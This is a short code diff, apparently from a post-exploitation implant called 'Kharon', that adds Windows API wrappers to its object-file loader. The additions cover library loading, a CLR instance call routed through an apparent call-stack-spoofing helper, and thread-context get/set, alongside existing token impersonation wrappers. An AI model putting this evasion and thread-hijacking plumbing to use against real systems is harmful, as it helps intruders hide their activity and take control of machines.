@@ -227,7 +227,6 @@ auto Coff::VirtualProtect(
     PDWORD OldProtect
 ) -> BOOL {
     G_KHARON
-
     return Self->Mm->Protect( Address, Size, NewProtect, OldProtect );
 }
 
@@ -252,17 +251,56 @@ auto Coff::OpenThread(
 }
 
 auto Coff::LoadLibraryA(
-    _In_ PCHAR LibraryName
+    CHAR* LibraryName
 ) -> HMODULE {
     G_KHARON
     return (HMODULE)Self->Lib->Load( LibraryName );
+}
+
+auto Coff::LoadLibraryW(
+    WCHAR* LibraryName
+) -> HMODULE {
+    G_KHARON
+
+    CHAR LibA[MAX_PATH] = { 0 };
+    Str::WCharToChar( LibA, LibraryName, MAX_PATH );
+
+    return (HMODULE)Self->Lib->Load( LibA );
+}
+
+auto Coff::CLRCreateInstance(
+    const IID &clsid, const IID &riid, LPVOID *ppInterface
+) -> HRESULT {
+    G_KHARON
+
+    return Self->Spf->Call(
+         (UPTR)Self->Mscoree.CLRCreateInstance, 
+         reinterpret_cast<UPTR>(&clsid),  
+         reinterpret_cast<UPTR>(&riid),
+         (UPTR)ppInterface
+    );
+}
+
+auto Coff::SetThreadContext(
+    HANDLE  Handle,
+    CONTEXT Ctx
+) -> BOOL {
+    G_KHARON
+    return Self->Td->SetCtx( Handle, Ctx );
+}
+
+auto Coff::GetThreadContext(
+    HANDLE  Handle,
+    CONTEXT Ctx
+) -> BOOL {
+    G_KHARON
+    return Self->Td->GetCtx( Handle, Ctx );
 }
 
 auto Coff::UseToken(
     HANDLE token
 ) -> BOOL {
     G_KHARON
-
     return Self->Tkn->Use( token );
 }
 
@@ -270,7 +308,6 @@ auto Coff::RevertToken(
     VOID
 ) -> VOID {
     G_KHARON
-
     Self->Tkn->Rev2Self();
 }
 
